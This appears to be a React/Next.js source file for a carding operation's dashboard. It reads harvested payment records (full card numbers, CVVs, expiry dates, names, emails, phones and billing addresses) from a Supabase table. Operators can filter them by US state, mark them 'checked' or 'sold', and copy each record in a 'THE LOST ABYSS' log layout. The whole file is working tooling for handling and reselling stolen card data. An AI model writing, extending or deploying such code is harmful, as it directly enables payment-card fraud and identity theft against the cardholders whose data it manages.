'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { Checkbox } from '@/components/ui/checkbox';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Eye, ArrowUpDown, Copy, Check, Download, Shield } from 'lucide-react';
import { supabase } from '@/lib/supabase';
import {
  Dialog,
  DialogContent,
  DialogHeader,
} from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { CreditCard } from '@/components/ui/credit-card';

interface BillingAddress {
  city: string;
  state: string;
  address: string;
  country: string;
  postal_code: string;
}

interface PaymentInfo {
  id: string;
  cardholder_name: string;
  user_email: string;
  phone_number: string;
  full_card_number: string;
  expiry_date: string;
  cvv: string;
  card_bin: string;
  billing_address: BillingAddress;
  created_at: string;
}

type SortField = 'state' | 'timestamp';
type SortDirection = 'asc' | 'desc';

const US_STATES = [
  { name: 'Alabama', abbr: 'AL' },
  { name: 'Alaska', abbr: 'AK' },
  { name: 'Arizona', abbr: 'AZ' },
  { name: 'Arkansas', abbr: 'AR' },
  { name: 'California', abbr: 'CA' },
  { name: 'Colorado', abbr: 'CO' },
  { name: 'Connecticut', abbr: 'CT' },
  { name: 'Delaware', abbr: 'DE' },
  { name: 'Florida', abbr: 'FL' },
  { name: 'Georgia', abbr: 'GA' },
  { name: 'Hawaii', abbr: 'HI' },
  { name: 'Idaho', abbr: 'ID' },
  { name: 'Illinois', abbr: 'IL' },
  { name: 'Indiana', abbr: 'IN' },
  { name: 'Iowa', abbr: 'IA' },
  { name: 'Kansas', abbr: 'KS' },
  { name: 'Kentucky', abbr: 'KY' },
  { name: 'Louisiana', abbr: 'LA' },
  { name: 'Maine', abbr: 'ME' },
  { name: 'Maryland', abbr: 'MD' },
  { name: 'Massachusetts', abbr: 'MA' },
  { name: 'Michigan', abbr: 'MI' },
  { name: 'Minnesota', abbr: 'MN' },
  { name: 'Mississippi', abbr: 'MS' },
  { name: 'Missouri', abbr: 'MO' },
  { name: 'Montana', abbr: 'MT' },
  { name: 'Nebraska', abbr: 'NE' },
  { name: 'Nevada', abbr: 'NV' },
  { name: 'New Hampshire', abbr: 'NH' },
  { name: 'New Jersey', abbr: 'NJ' },
  { name: 'New Mexico', abbr: 'NM' },
  { name: 'New York', abbr: 'NY' },
  { name: 'North Carolina', abbr: 'NC' },
  { name: 'North Dakota', abbr: 'ND' },
  { name: 'Ohio', abbr: 'OH' },
  { name: 'Oklahoma', abbr: 'OK' },
  { name: 'Oregon', abbr: 'OR' },
  { name: 'Pennsylvania', abbr: 'PA' },
  { name: 'Rhode Island', abbr: 'RI' },
  { name: 'South Carolina', abbr: 'SC' },
  { name: 'South Dakota', abbr: 'SD' },
  { name: 'Tennessee', abbr: 'TN' },
  { name: 'Texas', abbr: 'TX' },
  { name: 'Utah', abbr: 'UT' },
  { name: 'Vermont', abbr: 'VT' },
  { name: 'Virginia', abbr: 'VA' },
  { name: 'Washington', abbr: 'WA' },
  { name: 'West Virginia', abbr: 'WV' },
  { name: 'Wisconsin', abbr: 'WI' },
  { name: 'Wyoming', abbr: 'WY' }
];

export default function CardsClient({ type }: { type: string }) {
  const { toast } = useToast();
  const router = useRouter();
  const [cards, setCards] = useState<PaymentInfo[]>([]);
  const [loading, setLoading] = useState(true);
  const [stateFilter, setStateFilter] = useState<string | null>(null);
  const [sortField, setSortField] = useState<SortField>('timestamp');
  const [sortDirection, setSortDirection] = useState<SortDirection>('desc');
  const [selectedCard, setSelectedCard] = useState<PaymentInfo | null>(null);
  const [copied, setCopied] = useState(false);
  const [selectedCards, setSelectedCards] = useState<Set<string>>(new Set());
  const [showActionDialog, setShowActionDialog] = useState<'sold' | 'checked' | null>(null);
  const [actionNotes, setActionNotes] = useState('');

  useEffect(() => {
    async function fetchCards() {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        if (!session?.user) {
          router.push('/login');
          return;
        }

        // Fetch all cards
        const { data: allCards, error: cardsError } = await supabase
          .from('payment_info')
          .select('*')
          .order('created_at', { ascending: false });

        if (cardsError) throw cardsError;

        // Fetch checked and sold cards
        const [{ data: checkedCards }, { data: soldCards }] = await Promise.all([
          supabase.from('checked_cards').select('card_id, checked_at, notes'),
          supabase.from('sold_cards').select('card_id, sold_at, notes')
        ]);

        const checkedCardIds = new Set(checkedCards?.map(c => c.card_id) || []);
        const soldCardIds = new Set(soldCards?.map(c => c.card_id) || []);

        // Filter cards based on type
        let filteredCards = allCards || [];
        if (type === 'unchecked') {
          filteredCards = filteredCards.filter(card => 
            !checkedCardIds.has(card.id) && !soldCardIds.has(card.id)
          );
        } else if (type === 'checked') {
          filteredCards = filteredCards.filter(card => {
            const isChecked = checkedCardIds.has(card.id);
            const isSold = soldCardIds.has(card.id);
            return isChecked && !isSold;
          }).map(card => ({
            ...card,
            checked_cards: [{
              checked_at: checkedCards?.find(c => c.card_id === card.id)?.checked_at,
              notes: checkedCards?.find(c => c.card_id === card.id)?.notes
            }]
          }));
        } else if (type === 'sold') {
          filteredCards = filteredCards.filter(card => 
            soldCardIds.has(card.id)
          ).map(card => ({
            ...card,
            sold_cards: [{
              sold_at: soldCards?.find(c => c.card_id === card.id)?.sold_at,
              notes: soldCards?.find(c => c.card_id === card.id)?.notes
            }]
          }));
        }

        setCards(filteredCards);
      } catch (error) {
        console.error('Error fetching cards:', error);
        toast({
          title: "Error",
          description: "Failed to fetch cards data",
          variant: "destructive"
        });
      } finally {
        setLoading(false);
      }
    }

    fetchCards();
  }, [type, router, toast]);

  const toggleSort = (field: SortField) => {
    if (sortField === field) {
      setSortDirection(sortDirection === 'asc' ? 'desc' : 'asc');
    } else {
      setSortField(field);
      setSortDirection('asc');
    }
  };

  const handleSelectCard = (cardId: string) => {
    setSelectedCards(prev => {
      const newSet = new Set(prev);
      if (newSet.has(cardId)) {
        newSet.delete(cardId);
      } else {
        newSet.add(cardId);
      }
      return newSet;
    });
  };

  const handleSelectAll = () => {
    if (selectedCards.size === filteredAndSortedCards.length) {
      setSelectedCards(new Set());
    } else {
      setSelectedCards(new Set(filteredAndSortedCards.map(card => card.id)));
    }
  };

  const handleAction = async (action: 'sold' | 'checked') => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session?.user) return;

      const cards = Array.from(selectedCards).map(cardId => ({
        card_id: cardId,
        [`${action}_by`]: session.user.id,
        [`${action}_at`]: new Date().toISOString(),
        notes: actionNotes.trim() || null
      }));

      const { error } = await supabase
        .from(`${action}_cards`)
        .insert(cards);

      if (error) throw error;

      toast({
        title: "Success",
        description: `${selectedCards.size} card(s) marked as ${action}`
      });

      // Clear selection and notes
      setSelectedCards(new Set());
      setActionNotes('');
      
      // Refresh the cards list
      const { data: updatedCards, error: fetchError } = await supabase
        .from('payment_info')
        .select('*')
        .order('created_at', { ascending: false });

      if (fetchError) throw fetchError;
      setCards(updatedCards || []);
    } catch (err) {
      console.error(`Error marking cards as ${action}:`, err);
      toast({
        title: "Error",
        description: `Failed to mark cards as ${action}`,
        variant: "destructive"
      });
    }

    setShowActionDialog(null);
  };

  const filteredAndSortedCards = [...cards]
    .filter(card => !stateFilter || stateFilter === 'all' || 
      card.billing_address.state === stateFilter ||
      card.billing_address.state === US_STATES.find(s => s.name === stateFilter)?.abbr
    )
    .sort((a, b) => {
      if (sortField === 'state') {
        const stateA = a.billing_address.state.toUpperCase();
        const stateB = b.billing_address.state.toUpperCase();
        return sortDirection === 'asc'
          ? stateA.localeCompare(stateB)
          : stateB.localeCompare(stateA);
      } else if (type === 'checked' && 'checked_cards' in a) {
        const dateA = new Date(a.checked_cards[0]?.checked_at || '').getTime();
        const dateB = new Date(b.checked_cards[0]?.checked_at || '').getTime();
        return sortDirection === 'asc'
          ? dateA - dateB
          : dateB - dateA;
      } else if (type === 'sold' && 'sold_cards' in a) {
        const dateA = new Date(a.sold_cards[0]?.sold_at || '').getTime();
        const dateB = new Date(b.sold_cards[0]?.sold_at || '').getTime();
        return sortDirection === 'asc'
          ? dateA - dateB
          : dateB - dateA;
      } else {
        const dateA = new Date(a.created_at).getTime();
        const dateB = new Date(b.created_at).getTime();
        return sortDirection === 'asc'
          ? dateA - dateB
          : dateB - dateA;
      }
    });

  const copyAllDetails = async (card: PaymentInfo) => {
    const details = `+ ------------- THE LOST ABYSS --------------+
+ Personal Information
| Full Name : ${card.cardholder_name}
| Email : ${card.user_email}
| Phone : ${card.phone_number}
+ ------------------------------------------+
+ Payment Information
| Card Number : ${card.full_card_number}
| Card Expiry : ${card.expiry_date}
| CVV : ${card.cvv}
| BIN : ${card.card_bin}
+ ------------------------------------------+
+ Billing Information
| Address : ${card.billing_address.address}
| City : ${card.billing_address.city}
| State : ${card.billing_address.state}
| Postal Code : ${card.billing_address.postal_code}
| Country : ${card.billing_address.country}
+ ------------------------------------------+
+ Other Information
| Received : ${new Date(card.created_at).toLocaleString()}
+ ------------- THE LOST ABYSS  --------------+`;

    try {
      await navigator.clipboard.writeText(details);
      setCopied(true);
      toast({
        title: "Success",
        description: "Card details copied to clipboard"
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({
        title: "Failed",
        description: "Failed to copy details",
        variant: "destructive"
      });
    }
  };

  if (loading) {
    return <div className="p-8">Loading...</div>;
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold">{type === 'all' ? 'All' : type === 'sold' ? 'Sold' : type === 'checked' ? 'Checked' : 'Unchecked'} Cards</h1>
        {selectedCards.size > 0 && (
          <div className="flex gap-2">
            <Button
              variant="outline"
              onClick={() => setShowActionDialog('checked')}
              className="flex items-center gap-2"
            >
              <Shield className="h-4 w-4" />
              Mark as Checked
            </Button>
            <Button
              variant="default"
              onClick={() => setShowActionDialog('sold')}
              className="flex items-center gap-2"
            >
              <Download className="h-4 w-4" />
              Mark as Sold
            </Button>
          </div>
        )}
      </div>

      <div className="w-[200px]">
        <Select value={stateFilter || ""} onValueChange={setStateFilter}>
          <SelectTrigger>
            <SelectValue placeholder="Select a state" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All States</SelectItem>
            {US_STATES.map(state => (
              <SelectItem key={state.abbr} value={state.name}>
                {state.name} ({state.abbr})
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>

      <div className="rounded-md border border-border">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead className="w-[50px]">
                <Checkbox
                  checked={selectedCards.size === filteredAndSortedCards.length && filteredAndSortedCards.length > 0}
                  onCheckedChange={handleSelectAll}
                />
              </TableHead>
              <TableHead>Full Name</TableHead>
              <TableHead>
                <Button
                  variant="ghost"
                  onClick={() => toggleSort('state')}
                  className="h-8 px-2 hover:bg-transparent"
                >
                  State
                  <ArrowUpDown className="ml-2 h-4 w-4" />
                  {sortField === 'state' && (
                    <span className="ml-1 text-xs">
                      ({sortDirection === 'asc' ? 'A-Z' : 'Z-A'})
                    </span>
                  )}
                </Button>
              </TableHead>
              <TableHead>BIN</TableHead>
              <TableHead>
                <Button
                  variant="ghost"
                  onClick={() => toggleSort('timestamp')}
                  className="h-8 px-2 hover:bg-transparent"
                >
                  Timestamp
                  <ArrowUpDown className="ml-2 h-4 w-4" />
                  {sortField === 'timestamp' && (
                    <span className="ml-1 text-xs">
                      ({sortDirection === 'asc' ? 'Oldest' : 'Newest'})
                    </span>
                  )}
                </Button>
              </TableHead>
              <TableHead className="text-right pr-6">Actions</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredAndSortedCards.map((card) => (
              <TableRow key={card.id}>
                <TableCell>
                  <Checkbox
                    checked={selectedCards.has(card.id)}
                    onCheckedChange={() => handleSelectCard(card.id)}
                  />
                </TableCell>
                <TableCell>{card.cardholder_name}</TableCell>
                <TableCell>
                  {US_STATES.find(s => s.abbr === card.billing_address.state)?.name || card.billing_address.state}
                  {' '}
                  ({card.billing_address.state})
                </TableCell>
                <TableCell>{card.card_bin}</TableCell>
                <TableCell>{new Date(card.created_at).toLocaleString()}</TableCell>
                <TableCell className="text-right pr-4">
                  <div className="flex justify-end gap-2">
                    <Button
                      variant="outline"
                      size="icon"
                      className="h-8 w-8"
                      onClick={() => copyAllDetails(card)}
                    >
                      {copied ? (
                        <Check className="h-4 w-4" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                    <Button
                      variant="outline"
                      size="icon"
                      className="h-8 w-8"
                      onClick={() => setSelectedCard(card)}
                    >
                      <Eye className="h-4 w-4" />
                    </Button>
                  </div>
                </TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </div>

      <Dialog open={!!selectedCard} onOpenChange={(open) => !open && setSelectedCard(null)}>
        <DialogContent className="sm:max-w-[700px] max-h-[85vh] overflow-y-auto">
          <DialogHeader className="flex flex-col items-center space-y-2">
            {selectedCard && (
              <Button
                variant="outline"
                size="sm"
                onClick={() => selectedCard && copyAllDetails(selectedCard)}
              >
                {copied ? (
                  <Check className="h-4 w-4 mr-2" />
                ) : (
                  <Copy className="h-4 w-4 mr-2" />
                )}
                Copy Card Details
              </Button>
            )}
          </DialogHeader>
          {selectedCard && (
            <div className="space-y-6">
              <div className="flex justify-center">
                <CreditCard
                  cardNumber={selectedCard.full_card_number}
                  cardholderName={selectedCard.cardholder_name}
                  expiryDate={selectedCard.expiry_date}
                />
              </div>
              <div className="grid grid-cols-2 gap-4 text-center">
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Full Name</h4>
                  <p className="mt-1">{selectedCard.cardholder_name}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Email</h4>
                  <p className="mt-1">{selectedCard.user_email}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Phone</h4>
                  <p className="mt-1">{selectedCard.phone_number}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Card Number</h4>
                  <p className="mt-1">{selectedCard.full_card_number}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Card Expiry</h4>
                  <p className="mt-1">{selectedCard.expiry_date}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">CVV</h4>
                  <p className="mt-1">{selectedCard.cvv}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">BIN</h4>
                  <p className="mt-1">{selectedCard.card_bin}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Address</h4>
                  <p className="mt-1">{selectedCard.billing_address.address}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">City</h4>
                  <p className="mt-1">{selectedCard.billing_address.city}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">State</h4>
                  <p className="mt-1">{selectedCard.billing_address.state}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Postal Code</h4>
                  <p className="mt-1">{selectedCard.billing_address.postal_code}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Country</h4>
                  <p className="mt-1">{selectedCard.billing_address.country}</p>
                </div>
              </div>
              <div className="text-center">
                <h4 className="font-medium text-sm text-muted-foreground">Received</h4>
                <p className="mt-1">{new Date(selectedCard.created_at).toLocaleString()}</p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <AlertDialog 
        open={!!showActionDialog} 
        onOpenChange={(open) => !open && setShowActionDialog(null)}
      >
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>
              {showActionDialog === 'sold' ? 'Mark Cards as Sold' : 'Mark Cards as Checked'}
            </AlertDialogTitle>
            <AlertDialogDescription>
              {showActionDialog === 'sold' 
                ? 'This will mark the selected cards as sold. You can optionally add notes about this sale.'
                : 'This will mark the selected cards as checked. You can optionally add notes about this check.'
              }
            </AlertDialogDescription>
          </AlertDialogHeader>
          <div className="py-4">
            <textarea
              className="w-full min-h-[100px] rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
              placeholder={`Add notes about this ${showActionDialog} (optional)`}
              value={actionNotes}
              onChange={(e) => setActionNotes(e.target.value)}
            />
          </div>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction onClick={() => handleAction(showActionDialog!)}>
              {showActionDialog === 'sold' ? 'Mark as Sold' : 'Mark as Checked'}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}